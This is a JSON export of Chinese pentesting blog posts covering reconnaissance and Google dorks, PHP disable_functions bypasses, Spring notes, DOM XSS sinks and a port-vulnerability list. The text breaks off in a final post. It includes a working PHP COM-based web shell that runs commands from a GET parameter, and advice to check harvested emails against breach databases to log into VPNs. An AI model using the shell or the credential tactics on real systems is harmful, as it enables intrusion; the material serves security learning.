[{"title":"信息收集","url":"http://yoursite.com/2020/03/24/信息收集/","content":"<h1 id=\"信息收集\"><a href=\"#信息收集\" class=\"headerlink\" title=\"信息收集\"></a>信息收集</h1><p>在对web的渗透时，信息收集很重要，做了那么多安服项目，除了骚思路和深入利用外，常见的渗透目前感觉也就那样，但往往信息收集能发现很多有用的东西，特别是那种体量很大而公司对安全不重视的，经常能在网上发现一些公司重要信息，这里对信息收集的手段进行总结，不全面后面会补全。</p>\n<h2 id=\"域名信息收集\"><a href=\"#域名信息收集\" class=\"headerlink\" title=\"域名信息收集\"></a>域名信息收集</h2><p>项目开始首先给我们一个目标，如果是安服的话可能就是指定域名，红蓝的话就是哪个公司了，这里先对公司的信息进行收集。</p>\n<h3 id=\"目标旗下主域名查询\"><a href=\"#目标旗下主域名查询\" class=\"headerlink\" title=\"目标旗下主域名查询\"></a>目标旗下主域名查询</h3><p>首先我们访问官网，知道他的主要域名，然后whois查询。</p>\n<p><a href=\"http://whois.chinaz.com/\" target=\"_blank\" rel=\"noopener\">http://whois.chinaz.com/</a></p>\n<p><a href=\"https://x.threatbook.cn/\" target=\"_blank\" rel=\"noopener\">微步</a></p>\n<p>国内网站这两家应该是最好的。</p>\n<p>通过whois我们可以获取一些信息，通过获取的信息来邮箱反查等可以获取部分注册的域名信息。等我写完毕设我去写一个查询工具。找到足够的目标在红蓝和src时就有足够的攻击面。</p>\n<h3 id=\"子域名查询\"><a href=\"#子域名查询\" class=\"headerlink\" title=\"子域名查询\"></a>子域名查询</h3><p><a href=\"http://tools.bugscaner.com/subdomain/\" target=\"_blank\" rel=\"noopener\">http://tools.bugscaner.com/subdomain/</a></p>\n<p>site:xx.com</p>\n<p><a href=\"https://phpinfo.me/domain/\" target=\"_blank\" rel=\"noopener\">https://phpinfo.me/domain/</a></p>\n<p>DNS域传送漏洞</p>\n<p>子域名这种首先去寻找网站被搜索引擎，服务商收录的域名，然后再使用子域名爆破工具爆破，这里的爆破能力取决于字典的强度。</p>\n<h3 id=\"真实IP查询\"><a href=\"#真实IP查询\" class=\"headerlink\" title=\"真实IP查询\"></a>真实IP查询</h3><p>真实IP是绕过云waf的很好的方法，很多厂商以为自己被攻击是waf不行，其实不知道是自己未配置waf白名单，人家不走waf直接访问。</p>\n<p><a href=\"http://ping.chinaz.com/\" target=\"_blank\" rel=\"noopener\">http://ping.chinaz.com/</a>  //通过多地的ping测试可能绕过cdn直接访问ip。或者通过国外的域名解析记录商查看</p>\n<p>子域名ip，子域名和主域名可能在同一ip。</p>\n<p><a href=\"https://toolbar.netcraft.com/site_report\" target=\"_blank\" rel=\"noopener\">查看历史解析记录法</a>，可能历史解析记录会存放之前的未上waf的ip。</p>\n<p>邮箱，服务器有发邮件的功能那么可以通过邮件获取对方ip。</p>\n<p>漏洞法，ssrf等漏洞也可以获取ip。</p>\n<h2 id=\"网站信息收集\"><a href=\"#网站信息收集\" class=\"headerlink\" title=\"网站信息收集\"></a>网站信息收集</h2><h3 id=\"端口扫描\"><a href=\"#端口扫描\" class=\"headerlink\" title=\"端口扫描\"></a>端口扫描</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nmap -sS -Pn -p -A 1-65535 ip</span><br><span class=\"line\">nessus端口漏洞扫描</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"网站信息检测\"><a href=\"#网站信息检测\" class=\"headerlink\" title=\"网站信息检测\"></a>网站信息检测</h3><p><a href=\"http://www.yunsee.cn/\" target=\"_blank\" rel=\"noopener\">云悉</a></p>\n<p>wappalyzer</p>\n<p><a href=\"http://whatweb.bugscaner.com/look/\" target=\"_blank\" rel=\"noopener\">cms识别</a></p>\n<p>抓包报错信息。</p>\n<h2 id=\"敏感信息泄露\"><a href=\"#敏感信息泄露\" class=\"headerlink\" title=\"敏感信息泄露\"></a>敏感信息泄露</h2><h3 id=\"敏感文件泄露\"><a href=\"#敏感文件泄露\" class=\"headerlink\" title=\"敏感文件泄露\"></a>敏感文件泄露</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">site:xxx.com (filetype:doc OR filetype:ppt OR filetype:pps OR filetype:xls OR filetype:docx OR filetype:pptx OR filetype:ppsx OR filetype:xlsx OR filetype:odt OR filetype:ods OR filetype:odg OR filetype:odp OR filetype:pdf OR filetype:wpd OR filetype:svg OR filetype:svgz OR filetype:indd OR filetype:rdp OR filetype:sql OR filetype:xml OR filetype:db OR filetype:mdb OR filetype:sqlite)</span><br><span class=\"line\"></span><br><span class=\"line\">网盘</span><br><span class=\"line\">http://www.pansou.com/</span><br><span class=\"line\">http://www.daysou.com/</span><br><span class=\"line\">这里多找几个试试，多试试说不定就有希望</span><br><span class=\"line\"></span><br><span class=\"line\">目录扫描器</span><br><span class=\"line\">可以扫描如www.zip、.git等文件泄露</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"后台泄露\"><a href=\"#后台泄露\" class=\"headerlink\" title=\"后台泄露\"></a>后台泄露</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">robots.txt</span><br><span class=\"line\">site:xxx.xxx admin|login|system|管理|登录|内部|系统|邮件|email|mail|qq|群|微信|腾讯|</span><br><span class=\"line\">site:xxx.com inurl:login|admin|manage|admin_login|system|user|auth|dev|test</span><br><span class=\"line\">site:xxx.com intitle:后台|管理|内部|登录|系统</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"前端信息泄露\"><a href=\"#前端信息泄露\" class=\"headerlink\" title=\"前端信息泄露\"></a>前端信息泄露</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">前端html、jss的信息泄露</span><br><span class=\"line\"></span><br><span class=\"line\">浏览网站收集上面的电话、邮箱等信息，然后去库里面查密码，虽然不一定对当前测试的网站有用，但在红蓝时可能可以</span><br><span class=\"line\">登录vpn</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"github信息泄露\"><a href=\"#github信息泄露\" class=\"headerlink\" title=\"github信息泄露\"></a>github信息泄露</h3><p>这里是信息泄露的重点，很可能在上面找到密码等信息。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">xxx in:file,path //在文件名和路径中包含xxx</span><br><span class=\"line\">xxx repo:yyy //在yyy项目中包含xxx</span><br><span class=\"line\">xxx in:email //邮箱中包含xxx的用户</span><br><span class=\"line\"></span><br><span class=\"line\">##在搜索中in关键字能很好的帮助我们限定范围</span><br><span class=\"line\">in:name //在名称中</span><br><span class=\"line\">in:description //在描述中</span><br><span class=\"line\">in:readme //在readme中</span><br></pre></td></tr></table></figure>\n\n<p>多搜索一下很可能会有收获。</p>\n","categories":[],"tags":[]},{"title":"bypass_disable_func","url":"http://yoursite.com/2020/03/13/bypass-disable-func/","content":"<h1 id=\"disable-functions\"><a href=\"#disable-functions\" class=\"headerlink\" title=\"disable_functions\"></a>disable_functions</h1><p>disable_function可以用来禁用php函数。disable_functions = system这样就禁用了system函数。</p>\n<h1 id=\"绕过\"><a href=\"#绕过\" class=\"headerlink\" title=\"绕过\"></a>绕过</h1><h2 id=\"漏网之鱼\"><a href=\"#漏网之鱼\" class=\"headerlink\" title=\"漏网之鱼\"></a>漏网之鱼</h2><p>首先看对方的禁止是否全面。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">assert,system,passthru,exec,pcntl_exec,shell_exec,popen,proc_open,``(反单引号)</span><br></pre></td></tr></table></figure>\n\n<p>这是所有php执行命令的方法(网上搬的，不知道对不对)，遇到网上翻一翻，百度翻两页没有找到没过滤的就基本没有了。</p>\n<h2 id=\"组件漏洞\"><a href=\"#组件漏洞\" class=\"headerlink\" title=\"组件漏洞\"></a>组件漏洞</h2><p>利用phpinfo()查看服务器的配置信息，看是否存在有漏洞的组件。</p>\n<h2 id=\"com组件绕过\"><a href=\"#com组件绕过\" class=\"headerlink\" title=\"com组件绕过\"></a>com组件绕过</h2><p>安全模式也可以使用，安全模式没有禁止这个配置。</p>\n<h3 id=\"条件\"><a href=\"#条件\" class=\"headerlink\" title=\"条件:\"></a>条件:</h3><p>windows,应为COM组件是windows的组件。</p>\n<p>COM要能够启动。</p>\n<p>php.ini中com.allow_dcom = true，大于5.4的版本需要设置extension=php_com_dotnet.dll(具体最小什么版本不清楚但是我5.4.45就需要了)</p>\n<h3 id=\"利用\"><a href=\"#利用\" class=\"headerlink\" title=\"利用\"></a>利用</h3><p>具备条件后，上传到服务器。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">$command = $_GET[&apos;cmd&apos;];</span><br><span class=\"line\">$wsh = new COM(&apos;WScript.shell&apos;); // 生成一个COM对象 Shell.Application也能</span><br><span class=\"line\">$exec = $wsh-&gt;exec(&quot;cmd /c&quot;.$command); //调用对象方法来执行命令</span><br><span class=\"line\">$stdout = $exec-&gt;StdOut();</span><br><span class=\"line\">$stroutput = $stdout-&gt;ReadAll();</span><br><span class=\"line\">echo $stroutput;</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<p>访问,执行成功。</p>\n<p><img src=\"/2020/03/13/bypass-disable-func/1584071682129.png\" alt=\"1584071682129\"></p>\n<h2 id=\"LD-PRELOAD\"><a href=\"#LD-PRELOAD\" class=\"headerlink\" title=\"LD_PRELOAD\"></a>LD_PRELOAD</h2><h3 id=\"条件-1\"><a href=\"#条件-1\" class=\"headerlink\" title=\"条件\"></a>条件</h3><p>要有sendmail(我后面卸载了sendmail也行，不知道是不是卸载干净了)，apt-get remove卸载的又重启了ubuntu。</p>\n<p>使用cli的php.ini(这里不知道两个具体区别，有空下载下来对照下。)</p>\n<h3 id=\"利用-1\"><a href=\"#利用-1\" class=\"headerlink\" title=\"利用\"></a>利用</h3><p>原理可以参考<a href=\"https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD\" target=\"_blank\" rel=\"noopener\">https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD</a></p>\n<p>访问</p>\n<p><img src=\"/2020/03/13/bypass-disable-func/1584071702609.png\" alt=\"1584071702609\"></p>\n<p>结果</p>\n<p><img src=\"/2020/03/13/bypass-disable-func/1584071729727.png\" alt=\"1584071729727\"></p>\n<p>这里不知道什么未知原因直接从浏览器访问不行，只有将参数写入文件，终端用php命令才行访问文件才行。后面查了下是由于使用的php.ini不一样浏览器访问使用的fpm而终端使用的cli，我把cli的php.ini复制给fpm复现成功。</p>\n<p>目前来说就这三个我感觉好用一点，mod_cgi执行之类的感觉意义不大，就是一个研究目的。</p>\n","categories":[],"tags":[]},{"title":"java学习java框架","url":"http://yoursite.com/2020/03/06/java学习java框架/","content":"<h1 id=\"spring\"><a href=\"#spring\" class=\"headerlink\" title=\"spring\"></a>spring</h1><h2 id=\"ioc容器\"><a href=\"#ioc容器\" class=\"headerlink\" title=\"ioc容器\"></a>ioc容器</h2><p>ioc实现的是控制反转，简单点说由容器来实现对象的创建。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">在bean.xml中设置</span><br><span class=\"line\">&lt;bean id=&quot;test&quot; class=&quot;com.test1.test&quot;&gt;</span><br><span class=\"line\">        &lt;property name=&quot;name&quot; value=&quot;1&quot;/&gt;</span><br><span class=\"line\">        &lt;property name=&quot;age&quot; value=&quot;2&quot;/&gt;</span><br><span class=\"line\">&lt;/bean&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">ApplicationContext acx= new ClassPathXmlApplicationContext(&quot;bean.xml&quot;);</span><br><span class=\"line\">test id=acx.getBean(&quot;test&quot;,test.class);</span><br><span class=\"line\"></span><br><span class=\"line\">通过以上的方式获取test的实例并且可以设置属性值。</span><br><span class=\"line\">有两种方式设置一种使用对象中的set来设置，一种使用构造函数来设置。</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"BeanFactory-容器\"><a href=\"#BeanFactory-容器\" class=\"headerlink\" title=\"BeanFactory 容器\"></a>BeanFactory 容器</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">XmlBeanFactory factory = new XmlBeanFactory(new ClassPathResource(&quot;Beans.xml&quot;));</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"ApplicationContext-容器\"><a href=\"#ApplicationContext-容器\" class=\"headerlink\" title=\"ApplicationContext 容器\"></a>ApplicationContext 容器</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ApplicationContext相对于BeanFactory更加丰富，复杂的开发建议使用</span><br><span class=\"line\"></span><br><span class=\"line\">ApplicationContext context = new FileSystemXmlApplicationContext(&quot;bean文件绝对路径&quot;);</span><br><span class=\"line\">ApplicationContext acx= new ClassPathXmlApplicationContext(&quot;bean.xml&quot;);</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"作用域\"><a href=\"#作用域\" class=\"headerlink\" title=\"作用域\"></a>作用域</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;bean id=&quot;...&quot; class=&quot;...&quot; scope=&quot;prototype&quot;&gt;scope表明作用域</span><br><span class=\"line\">singleton:在spring IoC容器仅存在一个Bean实例，Bean以单例方式存在，默认值//理解为全局静态</span><br><span class=\"line\">prototype:每次从容器中调用Bean时，都返回一个新的实例，即每次调用getBean()时，相当于执行newXxxBean()</span><br><span class=\"line\">request:每次HTTP请求都会创建一个新的Bean，该作用域仅适用于WebApplicationContext环境</span><br><span class=\"line\">session:同一个HTTP Session共享一个Bean，不同Session使用不同的Bean，仅适用于WebApplicationContext环境</span><br><span class=\"line\">global-session:一般用于Portlet应用环境，该运用域仅适用于WebApplicationContext环境</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"自动装配\"><a href=\"#自动装配\" class=\"headerlink\" title=\"自动装配\"></a>自动装配</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;bean id=&quot;textEditor&quot; class=&quot;com.tutorialspoint.TextEditor&quot; autowire=&quot;byName&quot;&gt;</span><br><span class=\"line\">byName匹配与属性名字相同的bean。</span><br><span class=\"line\">byType匹配与属性类型相同的bean。</span><br><span class=\"line\">constructor匹配与构造函数参数类型相同的bean。</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"注解配置\"><a href=\"#注解配置\" class=\"headerlink\" title=\"注解配置\"></a>注解配置</h3><p>通过注解，会自动去bean中寻找相匹配的bean而不用在bean中配置来设值</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">@Required注解set方法</span><br><span class=\"line\">@Required</span><br><span class=\"line\">public setsek()&#123;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">@Autowired这个更加灵活，可以应用到 bean 属性的 setter 方法，非 setter 方法，构造函数和属性。</span><br><span class=\"line\">@Autowired</span><br><span class=\"line\">privite a a自动在beans中寻找a类型，找不到就匹配名字</span><br><span class=\"line\">@Autowired</span><br><span class=\"line\">public TextEditor(SpellChecker spellChecker)&#123;//注解构造函数</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">@Autowired</span><br><span class=\"line\">@Qualifier(&quot;mathstudent&quot;)//如果有多个同类型的bean就会寻找名字为mathstudent的bean</span><br><span class=\"line\">private Student student;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"AOP\"><a href=\"#AOP\" class=\"headerlink\" title=\"AOP\"></a>AOP</h2><p>面向切面编程，说的直白点就是在一个功能执行时我们规定在这个功能执行前后需要做什么事</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;aop:config&gt;</span><br><span class=\"line\">   &lt;aop:aspect id=&quot;myAspect&quot; ref=&quot;aBean&quot;&gt;//切入点前后要执行操作的来源</span><br><span class=\"line\">   &lt;aop:pointcut id=&quot;test&quot;</span><br><span class=\"line\">      expression=&quot;execution(* com.test.test1.*(..))&quot;/&gt;//配置切入点,切入com.test下的test1类中所有方法</span><br><span class=\"line\">      //前置通知，test切入点之前执行aBean的before方法</span><br><span class=\"line\">      &lt;aop:before pointcut-ref=&quot;test&quot; method=&quot;before&quot;/&gt;</span><br><span class=\"line\">      //后置通知,test切入点之后执行aBean的after方法</span><br><span class=\"line\">      &lt;aop:after pointcut-ref=&quot;test&quot; method=&quot;after&quot;/&gt;</span><br><span class=\"line\">      //返回通知，test切入点返回之后执行aBean的afterReturning方法</span><br><span class=\"line\">      &lt;aop:after-returning pointcut-ref=&quot;test&quot; </span><br><span class=\"line\">                              returning=&quot;retVal&quot;//返回值赋值的形参名</span><br><span class=\"line\">                              method=&quot;afterReturning&quot;/&gt;</span><br><span class=\"line\">      //异常通知，test切入点异常之后执行aBean的afterReturning方法</span><br><span class=\"line\">      &lt;aop:after-throwing pointcut-ref=&quot;test&quot; </span><br><span class=\"line\">                             throwing=&quot;ex&quot;//异常赋值的形参名</span><br><span class=\"line\">                             method=&quot;AfterThrowing&quot;/&gt;</span><br><span class=\"line\">      //循环通知，test切入点执行前后执行aBean的around方法</span><br><span class=\"line\">\t  &lt;aop:around pointcut-ref=&quot;test&quot; method=&quot;around&quot;/&gt;</span><br><span class=\"line\">   &lt;/aop:aspect&gt;</span><br><span class=\"line\">&lt;/aop:config&gt;</span><br><span class=\"line\">还有注解的形式，很简单，百度一查就知道</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"Spring-MVC\"><a href=\"#Spring-MVC\" class=\"headerlink\" title=\"Spring MVC\"></a>Spring MVC</h1><h2 id=\"执行流程\"><a href=\"#执行流程\" class=\"headerlink\" title=\"执行流程\"></a>执行流程</h2><p><img src=\"/2020/03/06/java学习java框架/1584870355364.png\" alt=\"1584870355364\"></p>\n<p>以helloworld为例</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">web.xml注册DispatcherServlet</span><br><span class=\"line\">&lt;servlet&gt;</span><br><span class=\"line\">      &lt;servlet-name&gt;HelloWeb&lt;/servlet-name&gt;</span><br><span class=\"line\">      &lt;servlet-class&gt;</span><br><span class=\"line\">         org.springframework.web.servlet.DispatcherServlet</span><br><span class=\"line\">      &lt;/servlet-class&gt;</span><br><span class=\"line\">      &lt;load-on-startup&gt;1&lt;/load-on-startup&gt;</span><br><span class=\"line\">   &lt;/servlet&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">   &lt;servlet-mapping&gt;</span><br><span class=\"line\">      &lt;servlet-name&gt;HelloWeb&lt;/servlet-name&gt;</span><br><span class=\"line\">      &lt;url-pattern&gt;/&lt;/url-pattern&gt;</span><br><span class=\"line\">   &lt;/servlet-mapping&gt;</span><br></pre></td></tr></table></figure>\n\n<p>注册控制器</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">@Controller</span><br><span class=\"line\">@RequestMapping(&quot;/hello&quot;)</span><br><span class=\"line\">public class HelloController&#123; </span><br><span class=\"line\">   @RequestMapping(method = RequestMethod.GET)</span><br><span class=\"line\">   public String printHello(ModelMap model) &#123;</span><br><span class=\"line\">      model.addAttribute(&quot;message&quot;, &quot;Hello Spring MVC Framework!&quot;);</span><br><span class=\"line\">      return &quot;hello&quot;;</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>在<em>WebContent/WEB-INF</em> 下helloweb-servlet.xml(这里的名字就是&lt;servlet-name&gt;标签加-servlet.xml)配置控制器。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;bean class=&quot;org.springframework.web.servlet.view.InternalResourceViewResolver&quot;&gt;</span><br><span class=\"line\">      &lt;property name=&quot;prefix&quot; value=&quot;/WEB-INF/jsp/&quot; /&gt;前缀</span><br><span class=\"line\">      &lt;property name=&quot;suffix&quot; value=&quot;.jsp&quot; /&gt;后缀</span><br><span class=\"line\">&lt;/bean&gt;</span><br><span class=\"line\">根据配置和返回值补全链接，这里就是/WEB-INF/jsp/hello.jsp</span><br></pre></td></tr></table></figure>\n\n<p>这里就是先根据web.xml来加载DispatcherServlet，然后访问控制器，通过控制器来完成后端处理，然后返回结果给前端。</p>\n","categories":[],"tags":[]},{"title":"DOM型XSS","url":"http://yoursite.com/2020/03/04/DOM型XSS/","content":"<p>相比于常见的反射和存储型xss，dom型的挖掘更有难度，想要完整的挖出所有dom型xss就需要审计前端js。</p>\n<p>DOM型xss的触发和常见xss触发一样，伪协议、on时间、&lt;script&gt;标签`</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">DOM型xss触发点，不一定全面，遇到了再添加。</span><br><span class=\"line\">document.write()</span><br><span class=\"line\">.innerHtml()</span><br><span class=\"line\">eval()</span><br><span class=\"line\">.append()</span><br><span class=\"line\">.href</span><br><span class=\"line\">setTimeout(&quot;alert(1)&quot;,1000)</span><br></pre></td></tr></table></figure>\n\n","categories":[],"tags":[]},{"title":"主机安全","url":"http://yoursite.com/2020/03/03/主机安全/","content":"<h2 id=\"常见端口及漏洞\"><a href=\"#常见端口及漏洞\" class=\"headerlink\" title=\"常见端口及漏洞\"></a>常见端口及漏洞</h2><p>粘贴，不知是否有错。</p>\n<p>1,web类(web漏洞/敏感⽬录) 第三⽅通⽤组件漏洞struts thinkphp jboss ganglia zabbix </p>\n<p>80 web </p>\n<p>80-89 web </p>\n<p>8000-9090 web </p>\n<p>2,数据库类(扫描弱⼝令) </p>\n<p>1433 MSSQL </p>\n<p>1521 Oracle </p>\n<p>3306 MySQL </p>\n<p>5432 PostgreSQL </p>\n<p>3,特殊服务类(未授权/命令执⾏类/漏洞) </p>\n<p>443 SSL⼼脏滴⾎ </p>\n<p>873 Rsync未授权 </p>\n<p>5984 CouchDB </p>\n<p>6379 redis未授权 </p>\n<p>7001,7002 WebLogic默认弱⼝令，反序列 </p>\n<p>9200,9300 elasticsearch 参考WooYun: 多玩某服务器ElasticSearch命令执⾏漏洞 </p>\n<p>11211 memcache未授权访问 </p>\n<p>27017,27018 Mongodb未授权访问 </p>\n<p>50000 SAP命令执⾏ </p>\n<p>50070,50030 hadoop默认端⼝未授权访问 </p>\n<p>4,常⽤端⼝类(扫描弱⼝令/端⼝爆破)2019/9/4 </p>\n<p>14/31 </p>\n<p>21 ftp </p>\n<p>22 SSH </p>\n<p>23 Telnet </p>\n<p>2601,2604 zebra路由，默认密码zebra </p>\n<p>3389 远程桌⾯ </p>\n<p>端⼝合计详情 </p>\n<p>21 ftp </p>\n<p>22 SSH </p>\n<p>23 Telnet </p>\n<p>80 web </p>\n<p>80-89 web </p>\n<p>161 SNMP </p>\n<p>389 LDAP </p>\n<p>443 SSL⼼脏滴⾎以及⼀些web漏洞测试 </p>\n<p>445 SMB </p>\n<p>512,513,514 Rexec </p>\n<p>873 Rsync未授权 </p>\n<p>1025,111 NFS </p>\n<p>1433 MSSQL </p>\n<p>1521 Oracle:(iSqlPlus Port:5560,7778) </p>\n<p>2082/2083 cpanel主机管理系统登陆 （国外⽤较多） </p>\n<p>2222 DA虚拟主机管理系统登陆 （国外⽤较多） </p>\n<p>2601,2604 zebra路由，默认密码zebra </p>\n<p>3128 squid代理默认端⼝，如果没设置⼝令很可能就直接漫游内⽹了 </p>\n<p>3306 MySQL </p>\n<p>3312/3311 kangle主机管理系统登陆 </p>\n<p>3389 远程桌⾯ </p>\n<p>4440 rundeck 参考WooYun: 借⽤新浪某服务成功漫游新浪内⽹ </p>\n<p>5432 PostgreSQL </p>\n<p>5900 vnc </p>\n<p>5984 CouchDB <a href=\"http://xxx:5984/_utils/\" target=\"_blank\" rel=\"noopener\">http://xxx:5984/_utils/</a> </p>\n<p>6082 varnish 参考WooYun: Varnish HTTP accelerator CLI 未授权访问易导致⽹站被直接篡改或者作 </p>\n<p>为代理进⼊内⽹ </p>\n<p>6379 redis未授权 </p>\n<p>7001,7002 WebLogic默认弱⼝令，反序列 </p>\n<p>7778 Kloxo主机控制⾯板登录2019/9/4 </p>\n<p>最新⼁2019版渗透测试⾯试题，值得⼀看！ </p>\n<p><a href=\"https://mp.weixin.qq.com/s/2Qt5a8plQu0JAto6tKVh6Q\" target=\"_blank\" rel=\"noopener\">https://mp.weixin.qq.com/s/2Qt5a8plQu0JAto6tKVh6Q</a> </p>\n<p>15/31 </p>\n<p>7778 Kloxo主机控制⾯板登录 </p>\n<p>8000-9090 都是⼀些常⻅的web端⼝，有些运维喜欢把管理后台开在这些⾮80的端⼝上 </p>\n<p>8080 tomcat/WDCP主机管理系统，默认弱⼝令 </p>\n<p>8080,8089,9090 JBOSS </p>\n<p>8083 Vestacp主机管理系统 （国外⽤较多） </p>\n<p>8649 ganglia </p>\n<p>8888 amh/LuManager 主机管理系统默认端⼝ </p>\n<p>9200,9300 elasticsearch 参考WooYun: 多玩某服务器ElasticSearch命令执⾏漏洞 </p>\n<p>10000 Virtualmin/Webmin 服务器虚拟主机管理系统 </p>\n<p>11211 memcache未授权访问 </p>\n<p>27017,27018 Mongodb未授权访问 </p>\n<p>28017 mongodb统计⻚⾯ </p>\n<p>50000 SAP命令执⾏ </p>\n<p>50070,50030 hadoop默认端⼝未授权访问 </p>\n","categories":[],"tags":[]},{"title":"java代码安全","url":"http://yoursite.com/2020/02/27/java代码安全/","content":"<h2 id=\"java代码安全\"><a href=\"#java代码安全\" class=\"headerlink\" title=\"java代码安全\"></a>java代码安全</h2><h3 id=\"文件操作\"><a 